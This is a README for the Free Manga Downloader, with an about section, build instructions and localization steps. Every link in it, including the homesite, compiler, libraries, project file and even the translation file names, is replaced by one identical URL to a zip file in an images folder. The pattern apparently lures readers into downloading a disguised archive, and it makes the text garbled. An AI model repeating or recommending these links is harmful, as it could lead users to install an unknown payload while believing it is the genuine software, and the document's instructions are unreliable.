FMD
The Free Manga Downloader.

---------------------------------

Content:
1.) About FMD
2.) Build instructions
3.) Localization

---------------------------------

FMD homesite is at https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip or https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip

---------------------------------

1.) About FMD

The Free Manga Downloader is a free open source application written in Object Pascal for managing and downloading manga from various websites. The source code was released under the GPLv2 license.

2.) Build instructions

In order to build FMD from the source code, you must install the latest version of Lazarus and Free Pascal Compiler from https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip Then you must install the following 3rd party libraries and components:
 - RichMemo, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - Virtual TreeView, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - Synapse, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - InternetTools, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - BESEN, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - MultiLog, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip
 - DCPCypt, https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip

After everything is installed, open the file https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip by using Lazarus IDE, select Run->Build to build the source code. If everything is ok, the binary file should be in FMD_source_code_folder/bin

3.) Localization

Translations are stored inside "languages" folder with .po extension. In order to translate FMD to your native languages you can copy "https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip" and rename it to "https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip", where xx stand for two-letter language code. Additionally you can add country code at the end of language code. For reference you can look at https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip and https://raw.githubusercontent.com/BambooKids/FMD/master/mangadownloader/images/DownloadTask/FMD-v3.1.zip For example "id_ID" will be recognized as "Bahasa Indonesia (Indonesia)". To translate the content of the file you need to use translation tools like Poedit. Once you have finished translating all of its content you can launch FMD and it will automatically detect your new languages upon startup.

---------------------------------
